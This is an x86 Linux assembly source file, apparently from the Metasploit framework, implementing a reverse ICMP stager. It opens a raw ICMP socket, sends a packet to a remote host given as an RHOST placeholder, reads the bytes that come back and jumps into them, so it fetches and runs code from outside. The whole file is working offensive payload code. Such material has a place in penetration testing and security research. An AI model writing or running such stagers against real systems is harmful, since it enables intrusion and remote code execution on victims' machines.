;;
; 
;        Name: stager_sock_reverse_icmp
;   Qualities: Can Have Nulls
;   Platforms: Linux
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision$
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Implementation of a Linux reverse ICMP stager.
;
;        File descriptor in edi.
;
;;
BITS   32
GLOBAL _start

_start:

socket:
	push byte 0x1
	pop  ebx
	push ebx
	push byte 0x3
	push byte 0x2
	push byte 0x66
	pop  eax
	cdq
	mov  ecx, esp
	int  0x80
	xchg eax, ebx

sendto:
	pop  ecx
	push dword 0x0100007f ; RHOST
	push ecx
	mov  ecx, esp
	push byte 0x41
;	push byte 0xcc   ; testing
	push byte 0x8
	mov  edi, esp
	push byte 0x10
	push ecx
	push edx
	push byte 0x5
	push edi
	push ebx
	mov  ecx, esp
	push 0xb
	pop  ebx
	mov  al, 0x66
	int  0x80

read:
	pop  ebx
	mov  al, 0x3
	mov  dh, 0xc
	int  0x80
	push byte 0x18
	pop  edx
	add  ecx, edx
	jmp  ecx